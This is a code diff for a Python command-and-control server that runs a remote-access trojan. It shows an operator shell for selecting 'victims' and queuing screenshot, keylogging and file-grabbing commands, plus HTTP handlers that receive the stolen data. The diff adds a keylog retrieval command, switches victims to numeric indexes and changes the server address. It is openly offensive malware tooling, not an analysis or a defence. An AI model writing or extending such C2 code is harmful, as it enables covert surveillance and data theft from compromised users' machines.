@@ -11,7 +11,7 @@ from Exceptions import SEQNumError, SEQSaveError
 import threading
 import cmd
 
-
+# Base Shell
 class BaseShell(cmd.Cmd):
     '''base'''
     prompt = "> "
@@ -48,16 +48,16 @@ class BaseShell(cmd.Cmd):
 class EntryShell(BaseShell):
     '''Entry Shell'''
 
-    def _get_victim_names(self) -> list:
+    def _get_victim_index(self) -> list:
         result = []
 
         for val in victim_table.values():
-            result.append(val['name'])
+            result.append(val['index'])
         return result
     
-    def _convert_victim_name_to_ip(self, vic_name) -> str:
+    def _convert_victim_index_to_ip(self, vic_index) -> str:
         for ip, value in victim_table.items():
-            if value['name'] == vic_name:
+            if value['index'] == vic_index:
                 return ip
         return False
 
@@ -65,18 +65,18 @@ class EntryShell(BaseShell):
     def do_use(self, arg):
         '''지정한 Victim의 쉘 모드로 진입'''
 
-        if arg and arg in self._get_victim_names():
+        if arg and arg in self._get_victim_index():
             victim_shell = VictimShell()
-            victim_shell.setTarget(arg, self._convert_victim_name_to_ip(arg))
+            victim_shell.setTarget(arg, self._convert_victim_index_to_ip(arg))
             victim_shell.cmdloop()
 
     def do_show(self, arg):
         '''show victim'''
         if arg == 'victim':
-            print('|%20s|%20s|%40s|' % ('name', 'ip', 'cmd queue'))
+            print('|%10s|%20s|%40s|' % ('index', 'ip', 'cmd queue'))
             print('-'*84)
             for ip in victim_table.keys():
-                print('|%20s|%20s|%40s|' % (victim_table[ip]['name'], ip, list(victim_table[ip]['command'])))
+                print('|%10s|%20s|%40s|' % (victim_table[ip]['index'], ip, list(victim_table[ip]['command'])))
 
 # 피해자 모드 쉘
 class VictimShell(BaseShell):
@@ -102,6 +102,18 @@ class VictimShell(BaseShell):
         elif arg == 'queue':
             print(list(victim_table[self.targetIP]['command']))
         pass
+
+    def do_get(self, arg):
+        global victim_table
+
+        if arg == 'screenshot':
+            victim_table[self.targetIP]['command'].append('[screenshot]')
+            pass
+        elif arg == 'keylog':
+            victim_table[self.targetIP]['command'].append('[keylog]')
+        elif arg == 'file':
+            # TODO gf
+            pass
 
     def do_gf(self, arg):
         '''get victim's file\nusage : gf [file path & name] or gf [victim file path & name] [save name]'''
@@ -218,11 +230,13 @@ class CNCServer(BaseHTTPRequestHandler):
     # vimctim 추가
     def _append_victim(self, victim_ip, victim_name=""):
         global victim_table
+        global victim_index
 
         if not victim_name:
             victim_name = victim_ip
 
-        victim_table[victim_ip] = {'name' : victim_name, 'command' : deque(), 'seqName' : deque(), 'shQueue' : deque()}
+        victim_table[victim_ip] = {'index' : str(victim_index), 'command' : deque(), 'seqName' : deque(), 'shQueue' : deque()}
+        victim_index += 1
 
     def _save_none_seq_file(self, victim_ip, data):
         try:
@@ -361,6 +375,9 @@ class CNCServer(BaseHTTPRequestHandler):
                 if data == "[screenshot]":
                     self._response_ftp_request("screenshot", victim_ip, datetime.now().strftime('%Y%m%d-%H%M%S.bmp'))
                     return
+                elif data == "[keylog]":
+                    self._response_ftp_request("keylog", victim_ip, "{}_keylog.txt".format(victim_ip))
+                    pass
                 # gf 명령어 처리
                 elif data.startswith('[gf'):
                     file_name = data.split(' ')
@@ -434,9 +451,10 @@ FILE_PATH = './file/'
 TMP_FILE_PATH = SEQManager.TMP_FILE_PATH
 
 ENCODING = 'cp949'
-SERVER_INFO = ('172.17.254.126', 80)
+SERVER_INFO = ('172.17.244.119', 80)
 
-victim_table = {} # {ip : {name : [name], command : [command queue], shCommand : [sh queue], seqName : [seqName queue]}}
+victim_table = {} # {ip : {index : [index num], command : [command queue], shCommand : [sh queue], seqName : [seqName queue]}}
+victim_index = 0
 
 
 # http server
